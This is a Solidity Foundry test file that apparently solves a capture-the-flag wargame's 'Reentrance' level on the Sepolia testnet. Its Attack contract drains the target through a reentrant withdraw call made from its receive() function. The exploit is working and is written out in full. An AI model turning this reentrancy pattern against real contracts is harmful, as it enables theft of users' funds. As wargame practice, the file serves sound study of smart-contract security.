// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/levels/10-Reentrance/Reentrance.sol";

contract ContractTest is Test {
    Attack AttackContract;
    Reentrance level10 = Reentrance(payable(0xa39E118398bEd4333bcF4346b8b58986F665AcF0));

    function setUp() public {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    AttackContract =  new Attack();
    }

    function testExploit10() public {
      AttackContract.donate{value: 0.001 ether}();
      console.log(address(level10).balance);
      AttackContract.hack();
      console.log(address(level10).balance);
    }
  receive() external payable {}
}




contract Attack {
   Reentrance target = Reentrance(0xa39E118398bEd4333bcF4346b8b58986F665AcF0);

   function donate() public payable {
       target.donate{value: msg.value}(address(this));
   }
   function hack() public {
       target.withdraw(0.001 ether);
   }

    receive() external payable {
       target.withdraw(0.001 ether);
   }
}


